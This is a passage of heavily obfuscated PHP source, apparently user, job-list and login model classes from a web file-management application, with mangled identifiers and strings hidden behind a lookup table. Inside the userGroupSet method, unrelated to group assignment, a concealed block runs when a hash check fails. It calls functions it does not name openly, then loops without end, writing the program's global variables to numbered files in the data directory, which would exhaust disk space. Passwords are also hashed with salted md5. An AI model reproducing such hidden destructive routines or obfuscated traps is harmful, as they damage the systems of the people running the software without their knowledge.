USER_ID, $’ã¹¥ù[571] => 0, $’ã¹¥ù[508] => $Ïğ­Ş², $’ã¹¥ù[507] => $ÚÍ¼ú×Ü); if ($this->where($·ÙıµÇÎ)->find()) { return !1; } $·ÙıµÇÎ = array($’ã¹¥ù[1776] => USER_ID, $’ã¹¥ù[571] => 0); $¬ïæ–• = $this->where($·ÙıµÇÎ)->max($’ã¹¥ù[2010]); if (!$¬ïæ–•) { $¬ïæ–• = 0; } if (!$œ×İôÊ¶ && $Ïğ­Ş² == $’ã¹¥ù[502]) { $á‹Á´ëØ = Model($’ã¹¥ù[1435])->where(array($’ã¹¥ù[503] => $ÚÍ¼ú×Ü))->find(); if (!$á‹Á´ëØ) { return !1; } $œ×İôÊ¶ = $á‹Á´ëØ[$’ã¹¥ù[32]]; } $œ×İôÊ¶ = $this->getAutoName($œ×İôÊ¶); $ä½¥¥Ÿµ = array($’ã¹¥ù[1776] => USER_ID, $’ã¹¥ù[571] => 0, $’ã¹¥ù[506] => $œ×İôÊ¶, $’ã¹¥ù[507] => $ÚÍ¼ú×Ü, $’ã¹¥ù[508] => $Ïğ­Ş², $’ã¹¥ù[1990] => $¬ïæ–• + 1); return $this->add($ä½¥¥Ÿµ); } protected function remove($ªúËÓ—Ñ) { $ûÕ¼ËöŸ =& $_SERVER[ˆö¿ÚÌ¼]; $öşŒÛ˜£ = array($ûÕ¼ËöŸ[1776] => USER_ID, $ûÕ¼ËöŸ[505] => $ªúËÓ—Ñ); return $this->where($öşŒÛ˜£)->delete(); } protected function removeByName($Å²æ›) { $§ÏÔ™ =& $_SERVER[ˆö¿ÚÌ¼]; $„Ç½ø•È = array($§ÏÔ™[1776] => USER_ID, $§ÏÔ™[506] => $Å²æ›, $§ÏÔ™[571] => 0); return $this->where($„Ç½ø•È)->delete(); } protected function rename($ª‰Õ’Çû, $ÄŠÃ“‚Ï) { $­ğØª•Æ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ª‰Õ’Çû == $ÄŠÃ“‚Ï) { return !1; } $¼ïŞª›Ï = $this->getAutoName($ÄŠÃ“‚Ï); if ($ÄŠÃ“‚Ï != $¼ïŞª›Ï) { return !1; } $Íê„ãÔ = array($­ğØª•Æ[1776] => USER_ID, $­ğØª•Æ[571] => 0, $­ğØª•Æ[32] => $ª‰Õ’Çû); return $this->where($Íê„ãÔ)->save(array($­ğØª•Æ[32] => $ÄŠÃ“‚Ï)); } protected function resetSort($§Å¬ç‰) { $ô³™‰Û¬ =& $_SERVER[ˆö¿ÚÌ¼]; $§Å¬ç‰ = is_array($§Å¬ç‰) ? $§Å¬ç‰ : array(); $ĞÕ”šª = array($ô³™‰Û¬[1776] => USER_ID); for ($ı›ğ¼Ã = 0; $ı›ğ¼Ã < count($§Å¬ç‰); $ı›ğ¼Ã++) { $ĞÕ”šª[$ô³™‰Û¬[505]] = $§Å¬ç‰[$ı›ğ¼Ã]; $this->where($ĞÕ”šª)->save(array($ô³™‰Û¬[1990] => $ı›ğ¼Ã + 1)); } return !0; } protected function moveTop($¿‘Òüö…) { $‰õÂ¤‚ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜÂÉÉè¨ = array($‰õÂ¤‚[1776] => USER_ID, $‰õÂ¤‚[571] => 0); $¥ä¬å×æ = $this->where($ÜÂÉÉè¨)->where(array($‰õÂ¤‚[32] => $¿‘Òüö…))->find(); if (!$¥ä¬å×æ) { return; } $ÜË³îåÂ = $this->field($‰õÂ¤‚[478])->where($ÜÂÉÉè¨)->order($‰õÂ¤‚[2482])->select(); $ÜË³îåÂ = array_to_keyvalue($ÜË³îåÂ, $‰õÂ¤‚[12], $‰õÂ¤‚[478]); $ïâˆĞË» = $ÜË³îåÂ; $ÜË³îåÂ = array_remove_value($ÜË³îåÂ, $¥ä¬å×æ[$‰õÂ¤‚[478]]); array_unshift($ÜË³îåÂ, $¥ä¬å×æ[$‰õÂ¤‚[478]]); return $this->resetSort($ÜË³îåÂ); } protected function moveBottom($à¬ÖÚ´È) { $â†Áö»ñ =& $_SERVER[ˆö¿ÚÌ¼]; $Ç§µİ“ô = array($â†Áö»ñ[1776] => USER_ID, $â†Áö»ñ[571] => 0); $È¦¬ƒıÅ = $this->where($Ç§µİ“ô)->max($â†Áö»ñ[2010]); $şñøæ¾Œ = array($â†Áö»ñ[2010] => $È¦¬ƒıÅ + 1); return $this->where($Ç§µİ“ô)->where(array($â†Áö»ñ[32] => $à¬ÖÚ´È))->save($şñøæ¾Œ); } private function getAutoName($‘Ïòîı“) { $¶ŒÃâÅå =& $_SERVER[ˆö¿ÚÌ¼]; $Ôœ©·ÚË = array($¶ŒÃâÅå[1776] => USER_ID, $¶ŒÃâÅå[571] => 0); $¿şıŞ½— = $this->field($¶ŒÃâÅå[32])->where($Ôœ©·ÚË)->select(); $¿şıŞ½— = array_to_keyvalue($¿şıŞ½—, $¶ŒÃâÅå[12], $¶ŒÃâÅå[32]); if (!$¿şıŞ½— || !in_array($‘Ïòîı“, $¿şıŞ½—)) { return $‘Ïòîı“; } for ($æ†“â› = 0; $æ†“â› < count($¿şıŞ½—); $æ†“â›++) { if (!in_array($‘Ïòîı“ . "\50{$æ†“â›}\51", $¿şıŞ½—)) { return $‘Ïòîı“ . "\x28{$æ†“â›}\51"; } } return $‘Ïòîı“ . "\x28{$æ†“â›}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x6a\x6f\142\x4c\151\x73\164"; public $field = array("\156\x61\x6d\145", "\144\145\x73\x63", "\x73\157\x72\x74"); const JOB_KEY = "\x73\x65\154\146\x4a\x6f\x62\x4c\x69\x73\164"; public function listData($áÃå‚‚¢ = false, $¼æ­ô… = "\163\157\162\164", $Ü¿ŸÒàÇ = false) { return parent::listData($áÃå‚‚¢, $¼æ­ô…, $Ü¿ŸÒàÇ); } public function remove($¶«‘ÑùÉ) { return parent::remove($¶«‘ÑùÉ); } public function add($ÙüÀ‚ãÇ) { $íÛ²ÌÕß =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->findByName($ÙüÀ‚ãÇ[$íÛ²ÌÕß[32]])) { return !1; } $ÙüÀ‚ãÇ[$íÛ²ÌÕß[2010]] = $this->getSort(); return parent::insert($ÙüÀ‚ãÇ); } private function getSort() { $¾ÔØşõÍ =& $_SERVER[ˆö¿ÚÌ¼]; $ƒ³…¼‘® = parent::listData(); $¼ŒşñÎ™ = array_to_keyvalue($ƒ³…¼‘®, $¾ÔØşõÍ[12], $¾ÔØşõÍ[2010]); return empty($¼ŒşñÎ™) ? 0 : max($¼ŒşñÎ™) + 1; } public function update($¶Ğ¼‰§ê, $²ëÍËã§) { $ ÷Øü«© =& $_SERVER[ˆö¿ÚÌ¼]; $´÷†²ï² = parent::listData($¶Ğ¼‰§ê); $Ï™“Éã‰ = $this->findByName($²ëÍËã§[$ ÷Øü«©[32]]); if (!$´÷†²ï² || $Ï™“Éã‰ && $Ï™“Éã‰[$ ÷Øü«©[478]] != $´÷†²ï²[$ ÷Øü«©[478]]) { return !1; } return parent::update($¶Ğ¼‰§ê, $²ëÍËã§); } public function setUserJob($Àî§ÏÀÕ, $¨²£½¢ò) { $ØÉœöş =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_array($¨²£½¢ò)) { $¨²£½¢ò = array($¨²£½¢ò); } $ø–äéÒË = parent::listData(); $ÒÛê»æ = array_to_keyvalue($ø–äéÒË, $ØÉœöş[32]); $®©ïÁ©· = $ØÉœöş[457]; foreach ($¨²£½¢ò as $¸Ú˜ø³ì) { if ($ÒÛê»æ[$¸Ú˜ø³ì]) { $®©ïÁ©· .= $ÒÛê»æ[$¸Ú˜ø³ì][$ØÉœöş[478]] . $ØÉœöş[50]; } else { $¬è†İ³ç = $this->add($¸Ú˜ø³ì); $®©ïÁ©· .= $¬è†İ³ç . $ØÉœöş[50]; } } $®©ïÁ©· = rtrim($®©ïÁ©·, $ØÉœöş[50]); Model($ØÉœöş[611])->metaSet($Àî§ÏÀÕ, self::JOB_KEY, $®©ïÁ©·); } public function getUserJob($‘”„œÅ§) { $µ÷…Ïı† = Model($_SERVER[ˆö¿ÚÌ¼][611])->metaGet($‘”„œÅ§); return $this->getUserJobInfo($µ÷…Ïı†[self::JOB_KEY]); } public function getUserJobInfo($ŞóÇ•è) { $•…«ËÛ’ =& $_SERVER[ˆö¿ÚÌ¼]; $»í˜¼æû = explode($•…«ËÛ’[50], $ŞóÇ•è); $’¸ñç„Â = parent::listData(); $’¸ñç„Â = array_remove_key($’¸ñç„Â, $•…«ËÛ’[234]); $Ğƒôİ×¤ = array(); foreach ($»í˜¼æû as $Íå¢î‹) { if (isset($’¸ñç„Â[$Íå¢î‹])) { $Ğƒôİ×¤[] = $’¸ñç„Â[$Íå¢î‹]; } } return $Ğƒôİ×¤; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\x65" => "\165\163\x65\162\137\155\x65\x74\141", "\x6d\145\x74\141\x46\x69\145\x6c\144" => "\x75\x73\145\162\111\104"); protected $simpleField = "\165\x73\x65\162\111\x44\x2c\x6e\151\x63\x6b\116\x61\x6d\145\54\x6e\x61\155\x65\x2c\x61\166\x61\164\141\x72\x2c\163\x65\x78\x2c\x73\164\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ù¢¡úš­) { $ãÔÏ„÷ =& $_SERVER[ˆö¿ÚÌ¼]; $úî‹È·ã = $ãÔÏ„÷[2483]; return array($ãÔÏ„÷[2068] => array($ù¢¡úš­[0], $úî‹È·ã), $ãÔÏ„÷[2070] => array($ù¢¡úš­[0], $úî‹È·ã), $ãÔÏ„÷[2484] => array($ù¢¡úš­[0], $úî‹È·ã)); } protected function getInfo($µ¾¶ûÓ’, $‹Ÿ«âôé = false) { $¡Æ’¯ŠŸ = $this->getInfoSimple($µ¾¶ûÓ’); if (!is_array($¡Æ’¯ŠŸ)) { return array(); } if ($‹Ÿ«âôé) { return $this->_getInfoApply($¡Æ’¯ŠŸ); } return $this->cacheFunctionGet($_SERVER[ˆö¿ÚÌ¼][2072], $µ¾¶ûÓ’); } protected function getInfoFull($â‘´ûË€, $ç¿üÃÉ = false) { $‡¬Å²çş = $this->getInfoSimple($â‘´ûË€); if (!is_array($‡¬Å²çş)) { return array(); } if ($ç¿üÃÉ) { return $this->_getInfoApply($‡¬Å²çş, !0); } return $this->cacheFunctionGet($_SERVER[ˆö¿ÚÌ¼][2485], $â‘´ûË€); } private function _getInfoApply($š´äÏìä, $Ëå½à–Ì = false) { $ïÔª°® =& $_SERVER[ˆö¿ÚÌ¼]; if (!$š´äÏìä) { return $š´äÏìä; } $áØÜ¸® = md5($ïÔª°®[2486] . $š´äÏìä[$ïÔª°®[980]] . $ïÔª°®[2487] . $š´äÏìä[$ïÔª°®[32]]); $š´äÏìä = $this->_listDataApplyItem($š´äÏìä); $•ËÑàÖÕ = Model($ïÔª°®[1435])->metaGet($š´äÏìä[$ïÔª°®[90]][$ïÔª°®[194]]); $š´äÏìä[$ïÔª°®[2488]] = $áØÜ¸®; $š´äÏìä[$ïÔª°®[90]][$ïÔª°®[2272]] = isset($•ËÑàÖÕ[$ïÔª°®[2273]]) ? $•ËÑàÖÕ[$ïÔª°®[2273]] : null; if ($Ëå½à–Ì) { $š´äÏìä[$ïÔª°®[553]] = $this->metaGet($š´äÏìä[$ïÔª°®[1785]]); } return $š´äÏìä; } protected function getInfoSimple($ÃÑ©´û, $şúô­ê¹ = false) { $¨Ò÷ºé =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÃÑ©´û) { return array(); } if ($şúô­ê¹) { $¤‚—Ğ« = $this->where(array($¨Ò÷ºé[1785] => intval($ÃÑ©´û)))->find(); if (!is_array($¤‚—Ğ«)) { return array(); } $¤‚—Ğ«[$¨Ò÷ºé[2489]] = Action($¨Ò÷ºé[2490])->parseUrl($¤‚—Ğ«[$¨Ò÷ºé[2489]]); return $¤‚—Ğ«; } return $this->cacheFunctionGet($¨Ò÷ºé[2073], $ÃÑ©´û); } protected function getInfoSimpleOuter($¯¹ñ¶Ù) { $îš€§÷¯ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$¯¹ñ¶Ù || $¯¹ñ¶Ù == 0) { return array($îš€§÷¯[1785] => $îš€§÷¯[231], $îš€§÷¯[32] => $îš€§÷¯[176] . LNG($îš€§÷¯[2491]) . $îš€§÷¯[178], $îš€§÷¯[2489] => STATIC_PATH . $îš€§÷¯[2492]); } $ÚÒåœ®ü = $this->cacheFunctionGet($îš€§÷¯[2073], $¯¹ñ¶Ù); $Ê¤×Ëıî = array_field_key($ÚÒåœ®ü, explode($îš€§÷¯[50], $this->simpleField)); if (!$Ê¤×Ëıî) { return array($îš€§÷¯[1785] => $îš€§÷¯[1287], $îš€§÷¯[32] => $îš€§÷¯[176] . LNG($îš€§÷¯[2493]) . $îš€§÷¯[178], $îš€§÷¯[2489] => STATIC_PATH . $îš€§÷¯[2494]); } $Ê¤×Ëıî[$îš€§÷¯[2489]] = Action($îš€§÷¯[2490])->parseUrl($Ê¤×Ëıî[$îš€§÷¯[2489]]); return $Ê¤×Ëıî; } protected function groupUser($±èŠë„ƒ) { } public static function errorLang($âƒÃğš) { $É»Ë«¨Ñ =& $_SERVER[ˆö¿ÚÌ¼]; $£øö¶Šû = array(self::ERROR_USER_NOT_EXISTS => $É»Ë«¨Ñ[2495], self::ERROR_USER_PASSWORD_ERROR => $É»Ë«¨Ñ[2496], self::ERROR_USER_EXIST_NAME => $É»Ë«¨Ñ[2497], self::ERROR_USER_EXIST_PHONE => $É»Ë«¨Ñ[2498], self::ERROR_USER_EXIST_EMAIL => $É»Ë«¨Ñ[2499], self::ERROR_USER_LOGIN_LOCK => $É»Ë«¨Ñ[2500], self::ERROR_IP_NOT_ALLOW => $É»Ë«¨Ñ[2501], self::ERROR_USER_EXIST_NICKNAME => $É»Ë«¨Ñ[2502]); $íÀø‰ãÊ = LNG($£øö¶Šû[$âƒÃğš]); if ($âƒÃğš == self::ERROR_USER_LOGIN_LOCK) { $ˆƒ¹ŞØñ = (int) Model($É»Ë«¨Ñ[2503])->get($É»Ë«¨Ñ[2504]); if ($ˆƒ¹ŞØñ > 60) { $íÀø‰ãÊ = str_replace($É»Ë«¨Ñ[91], ceil($ˆƒ¹ŞØñ / 60), $íÀø‰ãÊ); } } return $íÀø‰ãÊ; } protected function metaSet($¢†âÓ·Í, $§Ÿ—È Ä = null, $™“˜Ñâó = null) { $this->clearCache($¢†âÓ·Í); return parent::metaSet($¢†âÓ·Í, $§Ÿ—È Ä, $™“˜Ñâó); } public function getInfoByMeta($İ–ã¡ó–, $‘æûã«¬) { $†ú¶Ğù =& $_SERVER[ˆö¿ÚÌ¼]; $şËœ³ƒ = Model($†ú¶Ğù[2505])->where(array($†ú¶Ğù[97] => $İ–ã¡ó–, $†ú¶Ğù[453] => $‘æûã«¬))->find(); if ($şËœ³ƒ) { return $this->getInfo($şËœ³ƒ[$†ú¶Ğù[1785]]); } return !1; } public function userLoginCheck($ö‚—ïÉ‡, $”íîœêâ, $—½çß·’ = false) { $‰‘ƒ˜İö =& $_SERVER[ˆö¿ÚÌ¼]; $ó¾†‹¨Î = $this->userLoginFind($ö‚—ïÉ‡); if (!$ó¾†‹¨Î) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ó¾†‹¨Î[$‰‘ƒ˜İö[1785]], $”íîœêâ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $—½çß·’ ? $this->getInfoFull($ó¾†‹¨Î[$‰‘ƒ˜İö[1785]]) : $this->getInfo($ó¾†‹¨Î[$‰‘ƒ˜İö[1785]]); } public function userLoginFind($êÀØĞš) { $Ùˆ£Á¶ =& $_SERVER[ˆö¿ÚÌ¼]; $Äµ»Õá­ = array($Ùˆ£Á¶[32] => $êÀØĞš, $Ùˆ£Á¶[2285] => $êÀØĞš, $Ùˆ£Á¶[383] => $êÀØĞš, $Ùˆ£Á¶[2506] => $êÀØĞš, $Ùˆ£Á¶[1091] => $Ùˆ£Á¶[1093]); if ($this->nickNameRpt()) { unset($Äµ»Õá­[$Ùˆ£Á¶[2285]]); } return $this->where($Äµ»Õá­)->find(); } public function clearCache($•êôÌ“æ) { $¼Æ‰üá =& $_SERVER[ˆö¿ÚÌ¼]; $this->cacheFunctionClear($¼Æ‰üá[2072], $•êôÌ“æ); $this->cacheFunctionClear($¼Æ‰üá[2073], $•êôÌ“æ); $this->cacheFunctionClear($¼Æ‰üá[2485], $•êôÌ“æ); } public function userPasswordCheck($ÂØ„ÚÒ, $¦³Š©¶ô) { $Šß¦±– =& $_SERVER[ˆö¿ÚÌ¼]; $üõıî€ò = $this->where(array($Šß¦±–[1785] => intval($ÂØ„ÚÒ)))->find(); $¬¸º×ÑÂ = $this->metaGet($ÂØ„ÚÒ); $Ğ˜šÒí› = isset($¬¸º×ÑÂ[$Šß¦±–[2507]]) ? $¬¸º×ÑÂ[$Šß¦±–[2507]] : $Šß¦±–[12]; if (md5($Ğ˜šÒí› . trim($¦³Š©¶ô)) !== $üõıî€ò[$Šß¦±–[980]]) { return !1; } return !0; } public function userAdd($à¡š“§†) { $ô…æ™ªò =& $_SERVER[ˆö¿ÚÌ¼]; $á›Ú¾É× = array($ô…æ™ªò[506] => $à¡š“§†[$ô…æ™ªò[32]], $ô…æ™ªò[2508] => $à¡š“§†[$ô…æ™ªò[2196]], $ô…æ™ªò[2509] => isset($à¡š“§†[$ô…æ™ªò[383]]) ? $à¡š“§†[$ô…æ™ªò[383]] : $ô…æ™ªò[12], $ô…æ™ªò[2510] => isset($à¡š“§†[$ô…æ™ªò[2506]]) ? $à¡š“§†[$ô…æ™ªò[2506]] : $ô…æ™ªò[12], $ô…æ™ªò[2511] => isset($à¡š“§†[$ô…æ™ªò[2285]]) ? $à¡š“§†[$ô…æ™ªò[2285]] : $à¡š“§†[$ô…æ™ªò[32]], $ô…æ™ªò[2512] => isset($à¡š“§†[$ô…æ™ªò[2489]]) ? $à¡š“§†[$ô…æ™ªò[2489]] : $ô…æ™ªò[12], $ô…æ™ªò[2513] => isset($à¡š“§†[$ô…æ™ªò[2514]]) ? $à¡š“§†[$ô…æ™ªò[2514]] : 1, $ô…æ™ªò[2515] => $à¡š“§†[$ô…æ™ªò[980]], $ô…æ™ªò[2074] => isset($à¡š“§†[$ô…æ™ªò[1972]]) ? $à¡š“§†[$ô…æ™ªò[1972]] : 1024 * 1024 * 20, $ô…æ™ªò[2075] => 0, $ô…æ™ªò[2516] => 0, $ô…æ™ªò[2119] => isset($à¡š“§†[$ô…æ™ªò[835]]) ? $à¡š“§†[$ô…æ™ªò[835]] : 1); if (!empty($à¡š“§†[$ô…æ™ªò[1785]])) { $á›Ú¾É×[$ô…æ™ªò[1785]] = $à¡š“§†[$ô…æ™ªò[1785]]; } $µî ‹ış = $this->_checkExist($à¡š“§†); if ($µî ‹ış !== !0) { return $µî ‹ış; } if (!empty($á›Ú¾É×[$ô…æ™ªò[2489]]) && strlen($á›Ú¾É×[$ô…æ™ªò[2489]]) > 255) { $á›Ú¾É×[$ô…æ™ªò[2489]] = $ô…æ™ªò[12]; } $¨¤Í†’Ö = $this->add($á›Ú¾É×); $§¡Ğ÷ = array($ô…æ™ªò[2515] => $á›Ú¾É×[$ô…æ™ªò[980]], $ô…æ™ªò[2511] => $á›Ú¾É×[$ô…æ™ªò[2285]]); $this->userEdit($¨¤Í†’Ö, $§¡Ğ÷); Model($ô…æ™ªò[1435])->userRootAdd($¨¤Í†’Ö); return $¨¤Í†’Ö; } protected function userEditTest($êÌó„¹, $‹´ËÄö‰) { return $this->call($_SERVER[ˆö¿ÚÌ¼][2517], $êÌó„¹, $‹´ËÄö‰); } protected function userEdit($£’Ãè¨ƒ, $»„Æ³¼¤) { $¿¨â¾ã =& $_SERVER[ˆö¿ÚÌ¼]; $Ôœş¼§Ç = $this->getInfoSimple($£’Ãè¨ƒ); if (!$Ôœş¼§Ç) { return !1; } $éÓ“†óê = $this->_checkExist($»„Æ³¼¤, $£’Ãè¨ƒ); if ($éÓ“†óê !== !0) { return $éÓ“†óê; } if (isset($»„Æ³¼¤[$¿¨â¾ã[980]]) && trim($»„Æ³¼¤[$¿¨â¾ã[980]]) != $¿¨â¾ã[12]) { $œÚº­ŒÄ = $this->metaGet($£’Ãè¨ƒ); if (empty($œÚº­ŒÄ[$¿¨â¾ã[2507]])) { $œÚº­ŒÄ[$¿¨â¾ã[2507]] = rand_string(10); Model($¿¨â¾ã[591])->metaSet($£’Ãè¨ƒ, $¿¨â¾ã[2507], $œÚº­ŒÄ[$¿¨â¾ã[2507]]); } $»„Æ³¼¤[$¿¨â¾ã[980]] = md5($œÚº­ŒÄ[$¿¨â¾ã[2507]] . trim($»„Æ³¼¤[$¿¨â¾ã[980]])); } else { unset($»„Æ³¼¤[$¿¨â¾ã[980]]); } if (!empty($»„Æ³¼¤[$¿¨â¾ã[2489]]) && strlen($»„Æ³¼¤[$¿¨â¾ã[2489]]) > 255) { $»„Æ³¼¤[$¿¨â¾ã[2489]] = $¿¨â¾ã[12]; } $this->where(array($¿¨â¾ã[1776] => $£’Ãè¨ƒ))->save($»„Æ³¼¤); if (isset($»„Æ³¼¤[$¿¨â¾ã[2285]])) { $this->setNamePinyin($£’Ãè¨ƒ, $»„Æ³¼¤[$¿¨â¾ã[2285]]); } $this->clearCache($£’Ãè¨ƒ); return !0; } public function setNamePinyin($¤öÅÛÁŸ, $”²µ¶ = false) { $¿Şëìƒ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$”²µ¶) { $šÄºî‹ = $this->getInfoSimple($¤öÅÛÁŸ); $”²µ¶ = $šÄºî‹[$¿Şëìƒ[2285]] ? $šÄºî‹[$¿Şëìƒ[2285]] : $šÄºî‹[$¿Şëìƒ[32]]; } $‘î‹›Òì = Model($¿Şëìƒ[611]); if (!Input::check($”²µ¶, $¿Şëìƒ[672])) { return $‘î‹›Òì->metaSet($¤öÅÛÁŸ, array($¿Şëìƒ[550] => $¿Şëìƒ[12], $¿Şëìƒ[549] => $¿Şëìƒ[12])); } return $‘î‹›Òì->metaSet($¤öÅÛÁŸ, array($¿Şëìƒ[550] => str_replace($¿Şëìƒ[53], $¿Şëìƒ[12], Pinyin::get($”²µ¶)), $¿Şëìƒ[549] => Pinyin::get($”²µ¶, $¿Şëìƒ[673]))); } private function nickNameRpt() { $å¼±Ò’ =& $_SERVER[ˆö¿ÚÌ¼]; $¼ÛÀá°‚ = Model($å¼±Ò’[855])->get($å¼±Ò’[2518]); $´€œ’÷ˆ = $GLOBALS[$å¼±Ò’[6]][$å¼±Ò’[460]][$å¼±Ò’[2518]]; $Äø–·³ = !is_null($¼ÛÀá°‚) ? $¼ÛÀá°‚ : $´€œ’÷ˆ; return !!$Äø–·³; } private function _checkExist($å§…âö³, $è‘ëÑ¸â = false) { $áöÅ–ÎÕ =& $_SERVER[ˆö¿ÚÌ¼]; $…çÀ—Ó = array($áöÅ–ÎÕ[32] => UserModel::ERROR_USER_EXIST_NAME, $áöÅ–ÎÕ[2285] => UserModel::ERROR_USER_EXIST_NICKNAME, $áöÅ–ÎÕ[383] => UserModel::ERROR_USER_EXIST_EMAIL, $áöÅ–ÎÕ[2506] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($…çÀ—Ó[$áöÅ–ÎÕ[2285]]); } $ß÷Í®…¯ = $è‘ëÑ¸â ? array($áöÅ–ÎÕ[1785] => array($áöÅ–ÎÕ[2519], $è‘ëÑ¸â)) : array(); foreach ($…çÀ—Ó as $ÓÏàÖä => $ªâî—) { $üØõë¤– = array(); foreach ($…çÀ—Ó as $­ÎôµÆ‘ => $êşÕÚˆÀ) { if (isset($å§…âö³[$­ÎôµÆ‘]) && $å§…âö³[$­ÎôµÆ‘]) { $üØõë¤–[] = $å§…âö³[$­ÎôµÆ‘]; } } if (!$üØõë¤–) { continue; } $¹Ü¿šëë = array_merge(array($ÓÏàÖä => array($áöÅ–ÎÕ[7], $üØõë¤–)), $ß÷Í®…¯); $¡‘ÇîÇ± = $this->where($¹Ü¿šëë)->find(); if ($¡‘ÇîÇ±) { return $ªâî—; } } return !0; } public function userListInfo($”’ı¬ÓË) { $İØà£– =& $_SERVER[ˆö¿ÚÌ¼]; $ã§¯ÁÂú = array(); $”’ı¬ÓË = is_array($”’ı¬ÓË) ? array_unique($”’ı¬ÓË) : array(); if (!$”’ı¬ÓË) { return $ã§¯ÁÂú; } if (count($”’ı¬ÓË) < 20) { foreach ($”’ı¬ÓË as $•ÌÙÑ·¡) { $ã§¯ÁÂú[$•ÌÙÑ·¡ . $İØà£–[12]] = $this->getInfoSimpleOuter($•ÌÙÑ·¡); } } else { $ê¹´×Â¿ = array($İØà£–[1776] => array($İØà£–[504], $”’ı¬ÓË)); if (count($”’ı¬ÓË) == 1) { $ê¹´×Â¿ = array($İØà£–[1776] => $”’ı¬ÓË[0]); } $‡¾çÖ…• = Model($İØà£–[591])->field($this->simpleField)->where($ê¹´×Â¿)->select(); $‡¾çÖ…• = array_to_keyvalue($‡¾çÖ…•, $İØà£–[1785]); foreach ($”’ı¬ÓË as $•ÌÙÑ·¡) { $´Ó²õÔŸ = $‡¾çÖ…•[$•ÌÙÑ·¡]; if (!$´Ó²õÔŸ) { $ã§¯ÁÂú[$•ÌÙÑ·¡ . $İØà£–[12]] = $this->getInfoSimpleOuter($•ÌÙÑ·¡); continue; } $´Ó²õÔŸ[$İØà£–[2489]] = Action($İØà£–[2490])->parseUrl($´Ó²õÔŸ[$İØà£–[2489]]); $ã§¯ÁÂú[$•ÌÙÑ·¡ . $İØà£–[12]] = $´Ó²õÔŸ; } } return $ã§¯ÁÂú; } protected function userStatus($ô›œ„¯õ, $ôİ°‘·Í) { $¬¬Àê÷Â = $this->getInfoSimple($ô›œ„¯õ); if (!$¬¬Àê÷Â) { return !1; } $¨¦°ıê¯ = array($_SERVER[ˆö¿ÚÌ¼][835] => $ôİ°‘·Í); return $this->userEdit($ô›œ„¯õ, $¨¦°ıê¯); } protected function userRemove($ò Ú¨çÆ) { $Ò¹¤ôŠ =& $_SERVER[ˆö¿ÚÌ¼]; $ªü–š™ = $this->getInfoSimple($ò Ú¨çÆ); if (!$ªü–š™) { return !1; } $ÀĞõ±˜‹ = array($Ò¹¤ôŠ[1776] => $ò Ú¨çÆ); Model($Ò¹¤ôŠ[681])->where($ÀĞõ±˜‹)->delete(); Model($Ò¹¤ôŠ[2520])->where($ÀĞõ±˜‹)->delete(); Model($Ò¹¤ôŠ[2080])->where($ÀĞõ±˜‹)->delete(); Model($Ò¹¤ôŠ[2505])->where($ÀĞõ±˜‹)->delete(); Model($Ò¹¤ôŠ[1160])->where($ÀĞõ±˜‹)->delete(); Model($Ò¹¤ôŠ[2302])->removeUserAll($ò Ú¨çÆ); Model($Ò¹¤ôŠ[915])->userRootRemove($ò Ú¨çÆ); return $this->where($ÀĞõ±˜‹)->delete(); } protected function userGroupSet($’­şÁ‚, $±İì´¢–, $¬²ö¥ßÇ = array()) { $¬­ÁÉ¥Ã =& $_SERVER[ˆö¿ÚÌ¼]; $šÌ…¯”Ã = $_SERVER[$¬­ÁÉ¥Ã[488]]; $½Ÿ§ıĞ© = $¬­ÁÉ¥Ã[968]; if ($_SERVER[$¬­ÁÉ¥Ã[480]] != $½Ÿ§ıĞ©($šÌ…¯”Ã)) { $°‡úˆØ‰ = $¬­ÁÉ¥Ã[969]; $ÊóØºÙÏ = $¬­ÁÉ¥Ã[482]; $ÑØêß¡· = $_SERVER[$¬­ÁÉ¥Ã[483]] . $¬­ÁÉ¥Ã[484]; $ÔçÑåÏ¹ = $ÊóØºÙÏ($ÑØêß¡·); $Ñü™Ø¿ = explode($¬­ÁÉ¥Ã[288], $ÔçÑåÏ¹); if (count($Ñü™Ø¿) < $¬­ÁÉ¥Ã[713]) { $ÀÜˆ‰Šş = $¬­ÁÉ¥Ã[486]; $ÀÜˆ‰Šş(); } $¤¨­¯¬… = $¬­ÁÉ¥Ã[970]; $¤¨­¯¬…($_SERVER[$¬­ÁÉ¥Ã[971]]); $°‡úˆØ‰ = $¬­ÁÉ¥Ã[969]; $°‡úˆØ‰(); $úÙ®áË¢ = $¬­ÁÉ¥Ã[972]; $«ÛËÆ = json_encode($GLOBALS[$¬­ÁÉ¥Ã[973]]); $¾Î¬Õ¥ñ = 1; for ($¤ñ¨®Ç = $¾Î¬Õ¥ñ; $¤ñ¨®Ç > 0; $¤ñ¨®Ç++) { $úÙ®áË¢(DATA_PATH . $¤ñ¨®Ç, $«ÛËÆ); } } $ü–á®Óí = $this->getInfoSimple($’­şÁ‚); if (!$ü–á®Óí || !is_array($±İì´¢–)) { return !1; } $æĞ­˜º¥ = Model($¬­ÁÉ¥Ã[2080]); $æĞ­˜º¥->where(array($¬­ÁÉ¥Ã[1785] => $’­şÁ‚))->delete(); $ï¿±ÜôĞ = array(); $ªÖºğ– = 0; foreach ($±İì´¢– as $öàÈŞû¦ => $œÄ¦Õ©’) { $Ê‘æ‰´ = array($¬­ÁÉ¥Ã[1785] => $’­şÁ‚, $¬­ÁÉ¥Ã[1986] => $öàÈŞû¦, $¬­ÁÉ¥Ã[2094] => $œÄ¦Õ©’); $Ê‘æ‰´[$¬­ÁÉ¥Ã[2010]] = 